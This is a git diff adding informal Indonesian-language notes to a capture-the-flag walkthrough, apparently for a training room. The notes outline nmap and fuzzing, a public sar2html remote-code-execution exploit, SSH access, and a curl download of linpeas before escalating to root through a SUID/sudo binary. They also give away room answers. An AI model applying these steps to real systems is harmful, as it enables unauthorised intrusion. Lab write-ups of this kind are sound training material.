@@ -9,4 +9,32 @@
 - What's running on port 10000? :
 > cek di nmap 
 
--   
+-  Can you exploit the service running on that port? (yay/nay answer) :
+> keknya webmin gabisa di exploit dah, nay aja dah
+
+- What's CMS can you access? :
+> cek yang port 80 dah http, disitu fuzz aja nanti ada tuh cms disitu
+
+-  Keep enumerating, you'll know when you find it. :
+> dapet joomla fuzz lagi aja nanti ada vuln
+> nah ada dir _test tuh cek aja
+> dia ada sar2html, cek di google sar2html exploit, nanti ada rce
+
+- The interesting file name in the folder? :
+> run aja command ls di rce nya, nanti ada yg menarik dari situ
+
+
+2. Q2 :
+
+- Where was the other users pass stored(no extension, just the name)? :
+> cek aja pas udah ssh kesana ls in aja ada file menarik
+
+- user.txt :
+> cek aja di user yang di user satunya, pake ls -la nanti ada, bukan flag ternyata
+
+- What did you exploit to get the privileged user? :
+> pake linpeas, gabisa wget curl aja, curl ip:port/linpeas.sh -o linpeas.sh
+> dia kek binary sudo, nanti suid
+
+- root.txt :
+> di root lah
